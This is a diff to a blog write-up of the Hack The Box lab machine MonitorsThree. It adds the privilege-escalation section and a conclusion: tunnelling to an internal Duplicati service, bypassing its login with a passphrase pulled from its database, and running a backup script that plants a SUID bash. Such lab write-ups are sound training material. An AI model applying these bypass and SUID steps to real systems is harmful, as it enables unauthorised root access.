@@ -2,8 +2,10 @@
 layout: post
 title:  "Hack The Box: MonitorsThree Write-Up"
 category : writeup
-tags :  
+tags :  sqli cacti duplicati sshTunneling SUID_Bash CVE-2024-25641 RCE php 
 ---
+
+![alt text](/assets/blog/HTB-MonitorsThree/MonitorsThree.png)
 
 Machine Author(s): ruycr4ft & kavigihan
 
@@ -36,8 +38,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 22.10 seconds
 ```
 - The scan also reveals a redirection to the domain monitorsthree.htb so we add this to our /etc/hosts file
-## Foothold
 
+## Foothold
 ### Website TCP 80
 
 ![alt text](/assets/blog/HTB-MonitorsThree/monitorsthree_website.png)
@@ -504,13 +506,145 @@ b0c8428b7b0fec0b63b2b4e44406eeaa
 marcus@monitorsthree:~$
 ```
 
-
 ## Privilege Escalation
 
+Running `netstat -antup4` reveals an internal service running on port 8200 bound to 172.18.0.2 and 127.0.0.1
+This suggest the service on port 8200 is running on docker and is exposed internally on port 8200
 
+```bash
+marcus@monitorsthree:~$ netstat -antup4
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:38475         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:38448         127.0.0.1:8200          TIME_WAIT   -
+tcp        0      0 127.0.0.1:38486         127.0.0.1:8200          TIME_WAIT   -
+tcp        0      0 172.18.0.1:50018        172.18.0.2:8200         TIME_WAIT   -
+tcp        0      0 127.0.0.1:38460         127.0.0.1:8200          TIME_WAIT   -
+tcp        0      0 10.129.86.40:38826      10.10.14.225:1337       CLOSE_WAIT  -
+tcp        0      0 127.0.0.1:38446         127.0.0.1:8200          TIME_WAIT   -
+tcp        0      0 127.0.0.1:38476         127.0.0.1:8200          TIME_WAIT   -
+tcp        0      0 172.18.0.1:50036        172.18.0.2:8200         TIME_WAIT   -
+tcp        0      0 172.18.0.1:50026        172.18.0.2:8200         TIME_WAIT   -
+tcp        0      0 10.129.86.40:47668      10.10.14.225:1337       CLOSE_WAIT  -
+tcp        0      0 172.18.0.1:50008        172.18.0.2:8200         TIME_WAIT   -
+tcp        0      0 10.129.86.40:51522      10.10.14.225:1337       ESTABLISHED -
+tcp        0      0 172.18.0.1:50028        172.18.0.2:8200         TIME_WAIT   -
+tcp        0    276 10.129.86.40:22         10.10.14.225:44332      ESTABLISHED -
+udp        0      0 10.129.86.40:33162      1.1.1.1:53              ESTABLISHED -
+udp        0      0 10.129.86.40:33225      1.1.1.1:53              ESTABLISHED -
+udp        0      0 127.0.0.1:50307         127.0.0.53:53           ESTABLISHED -
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+```
+Since we have marcus ssh id_rsa private key we can tunnel target port 8200 through ssh, 127.0.0.1:8200
 
+![alt text](/assets/blog/HTB-MonitorsThree/duplicati.png)
+
+Duplicati is a free, open source, backup client that securely stores encrypted, incremental, compressed backups on cloud storage services and remote file servers. It works with:
+
+   Amazon S3, IDrive e2, Backblaze (B2), Box, Dropbox, FTP, Google Cloud and Drive, MEGA, Microsoft Azure and OneDrive, Rackspace Cloud Files, OpenStack Storage (Swift), Sia, Storj DCS, SSH (SFTP), WebDAV, Tencent Cloud Object Storage (COS), Aliyun OSS, and more!
+
+Duplicati is licensed under the MIT license and available for Windows, OSX and Linux (.NET 4.7.1+ or Mono 5.10.0+ required).
+
+---
+This docker-compose file confirms the duplicati is ran through docker
+```bash
+marcus@monitorsthree:/opt$ cat docker-compose.yml
+version: "3"
+
+services:
+  duplicati:
+    image: lscr.io/linuxserver/duplicati:latest
+    container_name: duplicati
+    environment:
+      - PUID=0
+      - PGID=0
+      - TZ=Etc/UTC
+    volumes:
+      - /opt/duplicati/config:/config
+      - /:/source
+    ports:
+      - 127.0.0.1:8200:8200
+    restart: unless-stopped
+
+marcus@monitorsthree:/opt$
+```
 
 ### Shell as root
+Checking the docker-compose.yml file shows some details
+
+```bash
+marcus@monitorsthree:/opt$ ll duplicati/config/
+total 2508
+drwxr-xr-x 4 root root    4096 Jan 17 15:09 ./
+drwxr-xr-x 3 root root    4096 Aug 18 08:00 ../
+drwxr-xr-x 3 root root    4096 Aug 18 08:00 .config/
+drwxr-xr-x 2 root root    4096 Aug 18 08:00 control_dir_v2/
+-rw-r--r-- 1 root root 2461696 Jan 17 14:09 CTADPNHLTC.sqlite
+-rw-r--r-- 1 root root   90112 Jan 17 15:09 Duplicati-server.sqlite
+```
+We will download the duplicati-server.sqlite file which is a database file
+
+
+After searching for a while i discovered there is an Authentication bypass in Duplicati and i followed the steps from [this](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) article
+
+Intercepting the login request to grab the `nonce` parameter
+![alt text](/assets/blog/HTB-MonitorsThree/duplicati_burp.png)
+
+
+The Option table from the sqlite database contains server-passphrase This passphrase attribute contains the secret
+`Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=`
+
+![alt text](/assets/blog/HTB-MonitorsThree/db_duplicati.png)
+
+Converting the obtained passphrase to hex using cyberchef yields this value `59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a` we will use this to obtain the valid noncedpwd needed as said in the article
+
+Using the browser console we will generate the noncedpwd 
+
+![alt text](/assets/blog/HTB-MonitorsThree/noncedpass.png)
+
+![alt text](/assets/blog/HTB-MonitorsThree/noncedpasswd_burp.png)
+
+We successfully bypassed the authentication,  Duplicati is running in docker instance with root privileges 
+
+![alt text](/assets/blog/HTB-MonitorsThree/duplicati_instance.png)
+
+---
+
+I was searching for a way to archieve code execution from duplicati backup, and i came accross [this](https://forum.duplicati.com/t/run-script-before-required-list-items-in-a-backup/17988/2) article. Throught the Duplicati command line we can run scripts
+
+I created this script that will copy the bash shell to the tmp folder and give it the suid bit right from there we can privesc,
+this is effectivey possible because the script is ran from the docker instance running with root privileges
+
+Running any backup will invoke the script `/source/tmp/privesc.sh`
+```bash
+marcus@monitorsthree:/tmp$ cat privesc.sh
+#!/bin/bash
+
+cp /bin/bash /source/tmp/bash
+chmod u+s /source/tmp/bash
+```
+![alt text](/assets/blog/HTB-MonitorsThree/root.png)
+
+
 
 ## Conclusion
+
+MonitorsThree revealed multiple critical vulnerabilities that allowed for complete system compromise. The initial foothold was gained through SQL injection in the password reset functionality, which leaked user credentials. These credentials provided access to a Cacti admin panel running version 1.2.26, which was vulnerable to authenticated RCE (CVE-2024-25641).
+
+Lateral movement to the marcus user was achieved by:
+
+Accessing MySQL database credentials from Cacti's config file, Extracting and cracking marcus's password hash from the database
+Using password reuse to switch to the marcus user
+
+The final privilege escalation to root exploited:
+
+A Duplicati backup service running as root in a Docker container Authentication bypass in Duplicati using the server passphrase from its SQLite database
+Duplicati's script execution feature during backups to create a SUID bash binary to gain root privileges
 
